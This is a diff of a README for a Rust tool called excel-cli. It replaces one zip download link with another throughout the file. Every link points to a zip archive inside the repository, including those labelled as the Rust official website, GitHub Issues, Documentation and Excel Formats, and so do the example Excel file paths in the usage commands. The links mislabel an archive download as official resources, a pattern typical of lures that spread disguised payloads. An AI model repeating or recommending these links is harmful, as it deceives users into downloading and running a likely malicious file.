@@ -1,6 +1,6 @@
 # 🚀 excel-cli - Convert Excel Files Easily
 
-[![Download Excel CLI](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip%20CLI-blue)](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip)
+[![Download Excel CLI](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip%20CLI-blue)](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip)
 
 ## 📝 Overview
 
@@ -17,14 +17,14 @@ The **excel-cli** is a powerful command line tool built with Rust. It helps you 
 ## 💻 System Requirements
 
 - **Operating System**: Windows 10, macOS, or any Linux distribution.
-- **Rust Installation**: You will need Rust installed on your system for the tool to work. If you don’t have Rust, visit the [Rust official website](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip) to download and install it.
+- **Rust Installation**: You will need Rust installed on your system for the tool to work. If you don’t have Rust, visit the [Rust official website](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip) to download and install it.
 - **Excel File**: Ensure you have an Excel file to convert, with either .xlsx or .xls extension.
 
 ## 🚀 Getting Started
 
 1. **Download the Tool**: 
 
-   Click the [Download button](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip) above to head to the Releases page. 
+   Click the [Download button](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip) above to head to the Releases page. 
 
 2. **Choose the Correct Version**: 
 
@@ -45,7 +45,7 @@ The **excel-cli** is a powerful command line tool built with Rust. It helps you 
 
 ## 📥 Download & Install
 
-To get started with **excel-cli**, visit [this page to download](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip).
+To get started with **excel-cli**, visit [this page to download](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip).
 
 ## 🔧 Usage Instructions
 
@@ -55,16 +55,16 @@ To get started with **excel-cli**, visit [this page to download](https://raw.git
 
 2. **Basic Conversion**: 
 
-   To convert an Excel file (e.g., `https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip`) to CSV, use the following command:
+   To convert an Excel file (e.g., `https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip`) to CSV, use the following command:
    ```
-   excel-cli convert https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip --to csv
+   excel-cli convert https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip --to csv
    ```
 
 3. **Advanced Usage**: 
 
    You can use filters with your conversion. For example, to convert and filter specific data:
    ```
-   excel-cli convert https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip --to json --filter "status='active'"
+   excel-cli convert https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip --to json --filter "status='active'"
    ```
 
 4. **Review Other Commands**: 
@@ -77,7 +77,7 @@ To get started with **excel-cli**, visit [this page to download](https://raw.git
 
 ## 🌐 Community and Support
 
-We welcome contributions and feedback from all users. If you encounter issues or have suggestions, feel free to reach out. You can open issues directly on the [GitHub Issues page](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip).
+We welcome contributions and feedback from all users. If you encounter issues or have suggestions, feel free to reach out. You can open issues directly on the [GitHub Issues page](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip).
 
 ## 📄 License
 
@@ -85,9 +85,9 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 🎓 Resources
 
-- [Documentation](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip)
-- [Rust Language](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip)
-- [Excel Formats](https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip)
+- [Documentation](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip)
+- [Rust Language](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip)
+- [Excel Formats](https://github.com/Rairy04/excel-cli/raw/refs/heads/master/docs/excel-cli-2.7-beta.5.zip)
 
 ## 📢 Acknowledgments
 
